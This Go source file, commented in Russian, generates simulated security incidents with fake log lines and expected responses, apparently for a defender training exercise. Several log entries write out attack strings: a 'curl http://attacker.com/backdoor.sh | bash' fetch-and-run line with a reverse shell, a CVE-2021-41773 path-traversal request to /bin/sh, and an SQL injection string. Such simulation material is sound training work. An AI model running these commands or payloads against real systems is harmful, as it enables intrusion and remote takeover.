package repository

import (
	"math/rand"
	"time"
)

// NetworkIncidentGenerator создаёт разнообразные сетевые инциденты
type NetworkIncidentGenerator struct {
	rand *rand.Rand
}

type NetworkIncident struct {
	Type        string
	Logs        []string
	Action      string
	Difficulty  int
	Description string
	RealImpact  string
}

func NewNetworkIncidentGenerator() *NetworkIncidentGenerator {
	return &NetworkIncidentGenerator{
		rand: rand.New(rand.NewSource(time.Now().UnixNano())),
	}
}

// DDoS-атаки
var ddosIncidents = []NetworkIncident{
	{
		Type:        "ddos_volumetric",
		Action:      "block",
		Difficulty:  1,
		Description: "Объёмная DDoS-атака на основе DNS усиления",
		RealImpact:  "DOWN, потеря данных в процессе, репутационный ущерб",
		Logs: []string{
			"[14:23:45] 10,000 пакетов/сек от 1.2.3.0/24",
			"[14:23:46] Полоса пропускания 50 Gbps",
			"[14:23:47] DNS-запросы с поддельных IP",
			"[14:23:48] HTTP-флуд на порт 80",
			"[14:23:49] TCP SYN flood - половина соединений в HALF_OPEN",
		},
	},
	{
		Type:        "ddos_application",
		Action:      "block",
		Difficulty:  2,
		Description: "Приложенческая DDoS-атака на уровне HTTP",
		RealImpact:  "Медленная загрузка сайта, истощение ресурсов серверов",
		Logs: []string{
			"[10:15:22] Много HTTP GET запросов на /api/login",
			"[10:15:23] User-Agent: Mozilla/5.0 (одинаковые)",
			"[10:15:24] 5000 req/sec на один endpoint",
			"[10:15:25] CPU на серверах 95%",
			"[10:15:26] Pool соединений БД исчерпана",
		},
	},
	{
		Type:        "ddos_botnet",
		Action:      "block",
		Difficulty:  3,
		Description: "Координированная атака от botnet с разных IP",
		RealImpact:  "Распределённая атака сложнее для блокировки, требует анализа паттернов",
		Logs: []string{
			"[09:00:01] Трафик от 50,000 IP адресов",
			"[09:00:02] Одинаковый User-Agent: MyBot/1.0",
			"[09:00:03] Координированное начало атаки",
			"[09:00:04] Разные географические локации",
			"[09:00:05] Меняющиеся порты и протоколы",
		},
	},
}

// Попытки взлома
var intrusionIncidents = []NetworkIncident{
	{
		Type:        "intrusion_bruteforce",
		Action:      "block",
		Difficulty:  1,
		Description: "Перебор пароля SSH на сервере",
		RealImpact:  "Несанкционированный доступ к серверу, установка backdoor",
		Logs: []string{
			"[11:30:12] SSH: Failed password for admin from 192.168.50.10",
			"[11:30:13] SSH: Failed password for admin from 192.168.50.10",
			"[11:30:14] SSH: Failed password for root from 192.168.50.10",
			"[11:30:15] 50+ неудачных попыток в минуту",
			"[11:30:16] Попытка подключения к портам 22, 2222, 22222",
		},
	},
	{
		Type:        "intrusion_sqli",
		Action:      "isolate",
		Difficulty:  2,
		Description: "SQL-инъекция в веб-приложение",
		RealImpact:  "Утечка данных из БД, деньги, ПД клиентов",
		Logs: []string{
			"[15:45:33] POST /search?q=' OR '1'='1",
			"[15:45:34] Аномальное количество SELECT из tables_schema",
			"[15:45:35] DB Query: SELECT * FROM users WHERE...",
			"[15:45:36] Попытка UNION SELECT для экспорта",
			"[15:45:37] Обнаружено 1000 строк выгрузили из БД",
		},
	},
	{
		Type:        "intrusion_rce",
		Action:      "isolate",
		Difficulty:  3,
		Description: "Remote Code Execution через уязвимость приложения",
		RealImpact:  "Полный контроль над сервером, установка бэкдора, кража данных",
		Logs: []string{
			"[12:22:10] POST /upload file: shell.php",
			"[12:22:11] PHP execution в документ root",
			"[12:22:12] whoami -> root",
			"[12:22:13] curl http://attacker.com/backdoor.sh | bash",
			"[12:22:14] Reverse shell установлен на attacker:4444",
		},
	},
}

// Утечки данных
var leakIncidents = []NetworkIncident{
	{
		Type:        "leak_unencrypted",
		Action:      "isolate",
		Difficulty:  1,
		Description: "Утечка незашифрованных данных через открытый S3 bucket",
		RealImpact:  "10,000 записей с данными клиентов в публичном доступе",
		Logs: []string{
			"[08:15:44] S3 Bucket: company-backups-2024 открыт для публичного доступа",
			"[08:15:45] Содержит: customers.csv, passwords.txt, api_keys.json",
			"[08:15:46] Размер: 2.3 GB",
			"[08:15:47] Download: 1000+ раз за час",
			"[08:15:48] CloudTrail Alert: Anonymous доступ к sensitive",
		},
	},
	{
		Type:        "leak_insider",
		Action:      "isolate",
		Difficulty:  2,
		Description: "Сотрудник закачивает данные на личный облак",
		RealImpact:  "Конфиденциальная информация компании утекла",
		Logs: []string{
			"[14:20:00] Сотрудник alice@company.com подключился к dropbox.com",
			"[14:20:01] Скачал 50 файлов из /confidential/financial",
			"[14:20:02] Загрузил архив financial_2024.zip на личный Dropbox",
			"[14:20:03] Поделился ссылкой с personal_email@gmail.com",
			"[14:20:04] DLP Alert: 1000+ сетевых пакетов необычного размера",
		},
	},
	{
		Type:        "leak_ransomware",
		Action:      "isolate",
		Difficulty:  3,
		Description: "Ransomware выгружает данные перед шифрованием (double-extortion)",
		RealImpact:  "Грозят опубликовать данные, требуют выкуп",
		Logs: []string{
			"[03:15:22] Обнаружено изменение 100,000 файлов за 5 минут",
			"[03:15:23] Расширение файлов изменено на .locked",
			"[03:15:24] Процесс svchost.exe использует 500 Mbps трафика",
			"[03:15:25] Соединение с C2 сервером 185.220.100.50:443",
			"[03:15:26] Note: Ваши данные скопированы. Переводите BTC на...",
		},
	},
}

// Конфигурационные ошибки
var misconfigIncidents = []NetworkIncident{
	{
		Type:        "misconfig_firewall",
		Action:      "patch",
		Difficulty:  1,
		Description: "Firewall случайно открыл доступ к production БД",
		RealImpact:  "Любой в интернете может подключиться к БД",
		Logs: []string{
			"[16:30:00] Firewall Rule #5432: 0.0.0.0/0 -> 10.0.1.50:5432",
			"[16:30:01] PostgreSQL доступна из интернета",
			"[16:30:02] Сканер Shodan найдёт в течение часов",
			"[16:30:03] Попытки подключения от 1.2.3.4, 5.6.7.8...",
		},
	},
	{
		Type:        "misconfig_service",
		Action:      "patch",
		Difficulty:  2,
		Description: "Уязвимая версия сервиса с известной CVE",
		RealImpact:  "Публичный exploit доступен, легко использовать",
		Logs: []string{
			"[10:45:15] Apache 2.4.49 запущен (CVE-2021-41773 RCE)",
			"[10:45:16] POST /cgi-bin/.%2e/.%2e/bin/sh",
			"[10:45:17] id -> uid=33(www-data)",
			"[10:45:18] Установлен shell на /var/www/backdoor",
		},
	},
	{
		Type:        "misconfig_api",
		Action:      "patch",
		Difficulty:  3,
		Description: "API без аутентификации возвращает чувствительные данные",
		RealImpact:  "OWASP Broken Authentication, утечка информации",
		Logs: []string{
			"[13:20:45] GET /api/users без Authorization header",
			"[13:20:46] Ответ 200 OK с полным списком пользователей",
			"[13:20:47] Включены поля: email, phone, ssn, salary",
			"[13:20:48] GET /api/admin возвращает системные пути",
		},
	},
}

// Другие типы инцидентов
var otherIncidents = []NetworkIncident{
	{
		Type:        "dns_spoofing",
		Action:      "block",
		Difficulty:  2,
		Description: "DNS Spoofing перенаправляет трафик на фишинг сайт",
		RealImpact:  "Пользователи попадают на поддельный сайт",
		Logs: []string{
			"[11:11:11] DNS Query для bank.com возвращает 185.220.100.1",
			"[11:11:12] Правильный IP: 93.184.216.34",
			"[11:11:13] TTL установлен на 3600 секунд",
			"[11:11:14] Фишинг сайт клонирует https://bank.com",
		},
	},
	{
		Type:        "mitm_ssl",
		Action:      "block",
		Difficulty:  3,
		Description: "Man-in-the-Middle с перехватом HTTPS через self-signed сертификат",
		RealImpact:  "Атакующий видит пароли и данные в открытом виде",
		Logs: []string{
			"[09:45:22] ARP Spoofing: attacker выдаёт себя за шлюз",
			"[09:45:23] Трафик перехватывается на port 8080",
			"[09:45:24] Сертификат: CN=bank.com (самоподписанный)",
			"[09:45:25] POST /login: password=123456 перехвачен",
		},
	},
	{
		Type:        "memcache_exposure",
		Action:      "isolate",
		Difficulty:  2,
		Description: "Memcache сервер открыт и содержит чувствительные кэшированные данные",
		RealImpact:  "Сессии, токены и кэшированные данные видны",
		Logs: []string{
			"[14:50:10] Memcache на 11211 доступен без пароля",
			"[14:50:11] get sessions:user:1000",
			"[14:50:12] Найдено 10,000 сессий с JWT токенами",
			"[14:50:13] Токены действительны, можно использовать",
		},
	},
}

// GenerateIncident создаёт случайный инцидент
func (g *NetworkIncidentGenerator) GenerateIncident(difficulty int) NetworkIncident {
	if difficulty < 1 || difficulty > 3 {
		difficulty = 1 + g.rand.Intn(3)
	}

	// Собираем все инциденты
	allIncidents := append(append(append(append(ddosIncidents, intrusionIncidents...), leakIncidents...), misconfigIncidents...), otherIncidents...)

	// Фильтруем по сложности
	var validIncidents []NetworkIncident
	for _, inc := range allIncidents {
		if inc.Difficulty <= difficulty {
			validIncidents = append(validIncidents, inc)
		}
	}

	// Добавляем случайность в логи
	selected := validIncidents[g.rand.Intn(len(validIncidents))]

	// Перемешиваем логи
	logs := make([]string, len(selected.Logs))
	for i, log := range selected.Logs {
		logs[i] = log
		if i > 0 && g.rand.Intn(100) < 30 {
			logs[i], logs[i-1] = logs[i-1], logs[i]
		}
	}

	selected.Logs = logs
	return selected
}

// GenerateMany создаёт множество инцидентов
func (g *NetworkIncidentGenerator) GenerateMany(count int) []NetworkIncident {
	result := make([]NetworkIncident, count)
	for i := 0; i < count; i++ {
		diff := (i / (count / 3)) + 1
		if diff > 3 {
			diff = 3
		}
		result[i] = g.GenerateIncident(diff)
	}
	return result
}

// GetIncidentTypes возвращает описание всех типов инцидентов
func (g *NetworkIncidentGenerator) GetIncidentTypes() map[string]string {
	return map[string]string{
		"ddos_volumetric":      "Объёмная атака - перегруз канала",
		"ddos_application":     "Приложенческая атака - истощение ресурсов",
		"ddos_botnet":          "Botnet атака - множество скоординированных источников",
		"intrusion_bruteforce": "Перебор пароля - множество попыток подключения",
		"intrusion_sqli":       "SQL-инъекция - манипуляция БД запросами",
		"intrusion_rce":        "Remote Code Execution - выполнение кода на сервере",
		"leak_unencrypted":     "Утечка незащищённых данных",
		"leak_insider":         "Утечка от инсайдера - сотрудника",
		"leak_ransomware":      "Ransomware с утечкой данных",
		"misconfig_firewall":   "Неправильная конфигурация firewall",
		"misconfig_service":    "Уязвимая версия сервиса",
		"misconfig_api":        "API без аутентификации",
		"dns_spoofing":         "Подделка DNS - перенаправление на фишинг",
		"mitm_ssl":             "Man-in-the-Middle атака с перехватом HTTPS",
		"memcache_exposure":    "Открытый кэш с чувствительными данными",
	}
}
